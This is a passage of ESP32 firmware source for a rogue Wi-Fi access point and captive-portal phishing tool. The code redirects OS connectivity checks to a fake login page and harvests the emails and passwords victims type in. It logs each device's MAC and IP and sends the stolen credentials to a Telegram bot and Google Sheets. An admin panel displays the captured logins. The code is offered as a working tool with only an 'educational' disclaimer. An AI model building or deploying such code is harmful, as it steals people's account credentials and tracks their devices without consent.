    Serial.println("❌ Failed to start Rogue AP");
    addSerialLog("Failed to create Rogue AP", "error");
  }

  dnsServer.start(DNS_PORT, "*", apIP);
  startTime = millis();

  ws.onEvent(onWebSocketEvent);
  server.addHandler(&ws);

  // =====================
  // SERVER ROUTES
  // =====================
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->send_P(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    
    if (request->hasParam("email", true) && request->hasParam("pass", true)) {
      String email = request->getParam("email", true)->value();
      String pass = request->getParam("pass", true)->value();
      String deviceInfo = getDeviceInfo(request);
      String timestamp = getCurrentTime();
      
      IPAddress remoteIP = request->client()->remoteIP();
      String ipStr = remoteIP.toString();
      String mac = "Unknown";
      
      wifi_sta_list_t wifi_sta_list;
      tcpip_adapter_sta_list_t adapter_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

      if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
          if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
              for (int i = 0; i < adapter_sta_list.num; i++) {
                  tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
                  if (IPAddress(station.ip.addr) == remoteIP) {
                      mac = formatMacAddress(station.mac);
                      authenticateDevice(mac);
                      break;
                  }
              }
          }
      }
      
      if (logins.size() < MAX_LOGINS) {
        logins.push_back({email, pass, timestamp, deviceInfo, mac, ipStr});
      }
      
      printToSerial(email, pass, deviceInfo);
      
      if (ENABLE_GOOGLE_SHEETS) {
        sendToGoogleSheets(email, pass, deviceInfo, mac, ipStr);
      }
      
      if (ENABLE_TELEGRAM) {
        String message = "🚨 NEW CREDENTIALS CAPTURED 🚨\n";
        message += "⏰ Time: " + timestamp + "\n";
        message += "📱 Device: " + deviceInfo + "\n";
        message += "📶 MAC: " + mac + "\n";
        message += "📍 IP: " + ipStr + "\n";
        message += "📧 Username/Email: " + email + "\n";
        message += "🔑 Password: " + pass + "\n";
        message += "🌐 Total Victims: " + String(totalVictims);
        
        sendTelegramMessage(message);
      }
    }
    
    request->redirect("http://instagram.com");
  });

  if (ENABLE_ADMIN_PANEL) {
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      
      if (adminLocked) {
        unsigned long currentTime = millis();
        if (currentTime - lockoutStart >= LOCKOUT_TIME) {
          adminLocked = false;
          failedAdminAttempts = 0;
          addSerialLog("Admin lockout period expired", "info");
        } else {
          String html = String(adminLoginPage);
          html.replace("%ERROR_MESSAGE%", "<div class='error-message'>⚠ System Locked: Too many failed attempts. Try again later.</div>");
          request->send(200, "text/html", html);
          return;
        }
      }
      
      String html = String(adminLoginPage);
      html.replace("%ERROR_MESSAGE%", "");
      request->send(200, "text/html", html);
    });
  
    server.on("/admin-verify", HTTP_POST, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      
      String ip = request->client()->remoteIP().toString();
      String mac = "Unknown";
      String userAgent = request->getHeader("User-Agent")->value();
      
      wifi_sta_list_t wifi_sta_list;
      tcpip_adapter_sta_list_t adapter_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

      if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
          if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
              for (int i = 0; i < adapter_sta_list.num; i++) {
                  tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
                  if (IPAddress(station.ip.addr) == request->client()->remoteIP()) {
                      mac = formatMacAddress(station.mac);
                      break;
                  }
              }
          }
      }
      
      if (request->hasParam("pin", true)) {
        String pin = request->getParam("pin", true)->value();
        bool success = (pin == adminPin);
        
        adminAttempts.push_back({ip, mac, getCurrentTime(), success, userAgent});
        if (adminAttempts.size() > 20) {
          adminAttempts.erase(adminAttempts.begin());
        }
        
        if (success) {
          failedAdminAttempts = 0;
          adminLocked = false;
          
          if (ENABLE_TELEGRAM) {
            String message = "🔓 Admin Login Successful\n";
            message += "⏰ Time: " + getCurrentTime() + "\n";
            message += "📶 MAC: " + mac + "\n";
            message += "🖥️ OS: " + getDeviceOS(userAgent) + "\n";
            message += "🌐 IP: " + ip;
            
            sendTelegramMessage(message);
          }
          
          request->send(200, "text/html", buildAdminPage());
        } else {
          failedAdminAttempts++;
          lastAdminAttempt = millis();
          
          if (ENABLE_TELEGRAM) {
            String message = "⚠ Admin Login Failed\n";
            message += "⏰ Time: " + getCurrentTime() + "\n";
            message += "📶 MAC: " + mac + "\n";
            message += "🖥️ OS: " + getDeviceOS(userAgent) + "\n";
            message += "🌐 IP: " + ip + "\n";
            message += "🔢 Attempts: " + String(failedAdminAttempts);
            
            sendTelegramMessage(message);
          }
          
          if (failedAdminAttempts >= MAX_ADMIN_ATTEMPTS) {
            adminLocked = true;
            lockoutStart = millis();
            addSerialLog("Admin panel locked due to too many failed attempts", "error");
          }
          
          String html = String(adminLoginPage);
          html.replace("%ERROR_MESSAGE%", "<div class='error-message'>⚠ Access Denied: Invalid Security PIN</div>");
          request->send(200, "text/html", html);
        }
      } else {
        request->redirect("/admin");
      }
    });
  
    server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      logins.clear();
      request->send(200, "text/html", buildAdminPage());
      addSerialLog("All captured credentials cleared", "warning");
    });
    
    server.on("/restart", HTTP_POST, [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "System restarting...");
      addSerialLog("System restart initiated by admin", "warning");
      delay(1000);
      ESP.restart();
    });
    
    server.on("/get-logs", HTTP_GET, [](AsyncWebServerRequest *request) {
      String json;
      StaticJsonDocument<1024> doc;
      JsonArray logs = doc.to<JsonArray>();
      
      for (const auto &log : serialLog) {
        JsonObject logEntry = logs.createNestedObject();
        logEntry["message"] = log.message;
        logEntry["timestamp"] = log.timestamp;
        logEntry["type"] = log.type;
      }
      
      serializeJson(doc, json);
      request->send(200, "application/json", json);
    });
    
    server.on("/update-config", HTTP_POST, [](AsyncWebServerRequest *request) {
      if (request->hasParam("real_ssid", true)) {
        tempRealSSID = request->getParam("real_ssid", true)->value();
      }
      if (request->hasParam("real_pass", true)) {
        tempRealPassword = request->getParam("real_pass", true)->value();
      }
      if (request->hasParam("rogue_ssid", true)) {
        tempRogueSSID = request->getParam("rogue_ssid", true)->value();
      }
      if (request->hasParam("telegram_chat", true)) {
        tempTelegramChatID = request->getParam("telegram_chat", true)->value();
      }
      if (request->hasParam("internet", true)) {
        tempInternetEnabled = request->getParam("internet", true)->value() == "on";
      }
      
      request->send(200, "text/html", buildAdminPage());
      addSerialLog("Configuration updated", "info");
    });
  }

  server.onNotFound([](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });

  server.begin();

  Serial.println("\n\n");
  delay(50);
  Serial.println("   ╔══════════════════════════════════════════════════════════════════╗");
  delay(50);
  Serial.println("   ║  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                    ║");
  delay(50);
  Serial.println("   ║  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                    ║");
  delay(50);
  Serial.println("   ║  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                    ║");
  delay(50);
  Serial.println("   ║  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                    ║");
  delay(50);
  Serial.println("   ║  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                    ║");
  delay(50);
  Serial.println("   ║  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                    ║");
  delay(50);
  Serial.println("   ║                                                                  ║");
  delay(50);
  Serial.println("   ║   ██╗    ██╗██╗███████╗██╗  ██╗██╗  ██╗                         ║");
  delay(50);
  Serial.println("   ║   ██║    ██║██║██╔════╝██║  ██║██║  ██║                         ║");
  delay(50);
  Serial.println("   ║   ██║ █╗ ██║██║█████╗  ███████║███████║                         ║");
  delay(50);
  Serial.println("   ║   ██║███╗██║██║██╔══╝  ██╔══██║██╔══██║                         ║");
  delay(50);
  Serial.println("   ║   ╚███╔███╔╝██║██║     ██║  ██║██║  ██║                         ║");
  delay(50);
  Serial.println("   ║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝                         ║");
  delay(50);
  Serial.println("   ╚══════════════════════════════════════════════════════════════════╝");
  delay(50);
  Serial.println("\n   ╔══════════════════════════════════════════════════════════════════╗");
  delay(50);
  Serial.println("   ║                    NEXUS WIFI SECURITY v5.0                      ║");
  delay(50);
  Serial.println("   ║           Advanced Captive Portal & Threat Intelligence          ║");
  delay(50);
  Serial.println("   ╠══════════════════════════════════════════════════════════════════╣");
  delay(50);
  Serial.println("   ║         Developed by: Muhammad Javed Hussain                    ║");
  delay(50);
  Serial.println("   ║         GitHub: github.com/iamjaved026/nexus-wifi               ║");
  delay(50);
  Serial.println("   ║         License: Educational & Research Only                    ║");
  delay(50);
  Serial.println("   ║         © 2025 - Advanced Security Platform                     ║");
  delay(50);
  Serial.println("   ╚══════════════════════════════════════════════════════════════════╝");
  delay(50);

  Serial.println("\n[NEXUS WIFI INITIALIZING...]");
  delay(50);
  Serial.println("> Booting sequence started");
  delay(50);
  Serial.println("> Loading core modules");
  delay(50);
  Serial.println("> Starting security protocols");
  delay(50);
  Serial.println("> Nexus security layer active");
  delay(50);
  Serial.println("> Threat detection online");
  delay(50);
  Serial.println("> Captive portal ready");
  delay(50);
  Serial.println("> MAC authentication enabled");
  delay(50);
  Serial.println("> Telegram bridge online");
  delay(50);

  Serial.println("\n> Web Server Started ✅");
  delay(50);
  Serial.println("> DNS Server Started ✅");
  delay(50);
  Serial.println("> Captive Portal Activated ✅");
  delay(50);
  Serial.println("> MAC Authentication Enabled ✅");
  delay(50);
  Serial.println("> Telegram Bridge Online ✅");

  Serial.println("\n[NEXUS WIFI STATUS: OPERATIONAL]");
  Serial.println("> Awaiting connections...");
  Serial.println("> Monitoring network traffic...");

  Serial.println("\n╔══════════════════════════════════════════════════════════════════╗");
  Serial.println("║                         SYSTEM READY                             ║");
  Serial.println("╠══════════════════════════════════════════════════════════════════╣");
  Serial.printf("║  SSID (Rogue AP):    %-45s ║\n", rogueSSID);
  Serial.printf("║  Rogue AP IP:        %-45s ║\n", WiFi.softAPIP().toString().c_str());
  Serial.printf("║  Real Wi-Fi:         %-45s ║\n", WiFi.status() == WL_CONNECTED ? "Connected ✅" : "Disconnected ❌");
  Serial.printf("║  Real IP:            %-45s ║\n", WiFi.status() == WL_CONNECTED ? WiFi.localIP().toString().c_str() : "N/A");
  Serial.printf("║  System Uptime:      %-45s ║\n", getUptime().c_str());
  Serial.printf("║  Connected Devices:  %-45s ║\n", String(WiFi.softAPgetStationNum()).c_str());
  Serial.printf("║  Captured Logins:    %-45s ║\n", String(totalVictims).c_str());
  Serial.println("╠══════════════════════════════════════════════════════════════════╣");
  Serial.println("║  Admin Panel:       http://" + WiFi.softAPIP().toString() + "/admin                          ║");
  Serial.println("║  Captive Portal:    http://" + WiFi.softAPIP().toString() + "                                ║");
  Serial.println("╚══════════════════════════════════════════════════════════════════╝");

  Serial.println("\n╔══════════════════════════════════════════════════════════════════╗");
  Serial.println("║  ⚠️                      LEGAL DISCLAIMER                          ║");
  Serial.println("╠══════════════════════════════════════════════════════════════════╣");
  Serial.println("║  This software is for educational and research purposes only    ║");
  Serial.println("║  Unauthorized use may violate laws in your jurisdiction         ║");
  Serial.println("║  User assumes ALL legal responsibility for usage                ║");
  Serial.println("║  By continuing, you agree to the Privacy Policy                 ║");
  Serial.println("║  Developer (Muhammad Javed Hussain) assumes NO LIABILITY        ║");
  Serial.println("║  for any misuse or illegal activities.                          ║");
  Serial.println("╚══════════════════════════════════════════════════════════════════╝");

  Serial.println("\n[NEXUS WIFI] System initialization complete - Ready for connections");
  Serial.println("[NEXUS WIFI] Monitor using: http://" + WiFi.softAPIP().toString() + "/admin");
  Serial.println("[NEXUS WIFI] GitHub: github.com/iamjaved026/nexus-wifi");

  addSerialLog("System initialization complete", "success");
}

// =====================
// MAIN LOOP
// =====================
void loop() {
  dnsServer.processNextRequest();
  ws.cleanupClients();
  
  static unsigned long lastCleanup = 0;
  if (millis() - lastCleanup > 60000) {
    unsigned long currentTime = millis();
    for (int i = connectedDevices.size() - 1; i >= 0; i--) {
      if (currentTime - connectedDevices[i].lastSeen > 300000) {
        addSerialLog("Device disconnected: " + connectedDevices[i].mac + " (" + connectedDevices[i].os + ")", "info");
        connectedDevices.erase(connectedDevices.begin() + i);
      }
    }
    lastCleanup = millis();
  }
  
  if (adminLocked && (millis() - lockoutStart >= LOCKOUT_TIME)) {
    adminLocked = false;
    failedAdminAttempts = 0;
    addSerialLog("Admin lockout period expired", "info");
  }
  
  static unsigned long lastActivity = 0;
  if (millis() - lastActivity > 30000) {
    if (WiFi.softAPgetStationNum() > 0) {
      addSerialLog("System active | Devices: " + String(WiFi.softAPgetStationNum()) + 
                  " | Uptime: " + getUptime(), "info");
    }
    lastActivity = millis();
  }
  
  esp_task_wdt_reset();
  delay(10);
}
